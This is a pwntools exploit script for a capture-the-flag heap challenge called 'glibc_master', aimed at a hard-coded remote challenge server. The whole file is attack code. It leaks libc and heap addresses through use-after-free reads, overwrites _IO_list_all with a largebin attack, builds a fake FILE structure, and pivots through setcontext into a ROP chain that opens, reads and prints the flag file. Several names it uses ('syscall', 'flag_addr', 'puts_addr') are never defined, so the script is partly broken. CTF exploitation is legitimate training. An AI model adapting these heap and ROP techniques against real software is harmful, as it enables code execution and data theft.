# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './glibc_master'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '60.205.224.52'
    port = '24772'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a = 6      : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a = 4      : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla('>>',num)

def add(index , size):
    cmd(1)
    sla('index:' , index)
    sla('size:' , size)

def edit(idx , text):
    cmd(2)
    sla('index:' , idx)
    sa('context:' , text)

def show(idx ):
    cmd(3)
    sla('index:' , idx)

def delete(idx ):
    cmd(4)
    sla('index:' , idx)

def pack_file(_flags = 0,
    _IO_read_ptr = 0,
    _IO_read_end = 0,
    _IO_read_base = 0,
    _IO_write_base = 0,
    _IO_write_ptr = 0,
    _IO_write_end = 0,
    _IO_buf_base = 0,
    _IO_buf_end = 0,
    _IO_save_base = 0,
    _IO_backup_base = 0,
    _IO_save_end = 0,
    _IO_marker = 0,
    _IO_chain = 0,
    _fileno = 0,
    _flags2 = 0,
    _lock = 0,
    _wide_data = 0,
    _mode = 0):
    file_struct = p32(_flags) + \
        p32(0) + \
        p64(_IO_read_ptr) + \
        p64(_IO_read_end) + \
        p64(_IO_read_base) + \
        p64(_IO_write_base) + \
        p64(_IO_write_ptr) + \
        p64(_IO_write_end) + \
        p64(_IO_buf_base) + \
        p64(_IO_buf_end) + \
        p64(_IO_save_base) + \
        p64(_IO_backup_base) + \
        p64(_IO_save_end) + \
        p64(_IO_marker) + \
        p64(_IO_chain) + \
        p32(_fileno) + \
        p32(_flags2)
    file_struct = file_struct.ljust(0x88, '\x00')
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, '\x00')
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, '\x00')
    return file_struct

# one_gad = one_gadget(libc.path)

def attack():
    
    add(0 , 0x428)
    add(1 , 0x410)
    add(2 , 0x418)
    add(3 , 0x410)
    delete(0)
    show(0)

    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    libc_base = libc.address
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    _IO_list_all = libc.sym['_IO_list_all']
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    setcontext = libc.sym['setcontext']
    lg('__free_hook',__free_hook)
    pop_rax_ret = libc.search(asm('pop rax; ret')).next()
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
    pop_rdx_ret = libc.search(asm('pop rdx; ret')).next()
    pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
    ret = pop_rdi_ret + 1

    # dbg()
    delete(2)
    show(2)
    rl()
    heap_addr = uu64(6)
    heap_base = heap_addr - 0x290

    delete(1)
    add(10 , 0x600)
    add(11 , 0x600)
    # dbg()
    delete(11)
    delete(10)
    add(12 ,0x428)
    add(13 ,0x410)
    add(14 ,0x418)

    delete(0)
    add(15 , 0x438)
    delete(2)

    payload =  flat(0 ,libc_base + 0x1ebfd0 ,heap_addr,_IO_list_all-0x20 , 0 )+'\n'
    edit(0 ,payload)
    add(6,0x450)

    _IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
    _lock = libc_base + 0x1ee4b0
    fake_io_addr = heap_base + 0xae0

    file = pack_file(
        _flags = 0,
        _lock = _lock,
        _IO_write_ptr = 0xb81,
        _fileno = 2,
        _wide_data = fake_io_addr + 0xe0 ,
    ) + p64(_IO_wfile_jumps)

    payload = p64(fake_io_addr + 0xe8)+'\x00'*0x98
    payload += flat(fake_io_addr + 0xe0*2+0x10 , pop_rdi_ret )
    payload += '\x00'*0x30
    payload += p64(fake_io_addr + 0xe0*2-0x68+8)
    payload += flat(
        setcontext+61
    )
    payload += flat(
        0 ,pop_rax_ret ,3 ,syscall,
        pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , pop_rax_ret ,2 , syscall,
        pop_rdi_ret , 0 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , pop_rax_ret ,0 , syscall,
        pop_rdi_ret , flag_addr , puts_addr
    ) + 'flag\x00'

    payload = file + payload
    edit(11 , '\x00'*0x230 + payload + '\n')

    # dbg('_IO_wfile_overflow')
    delete(114514)
    # dbg()


    p.interactive()

attack()

'''
@File    :   glibc_master.py
@Time    :   2022/08/23 14:15:42
@Author  :   Niyah 
'''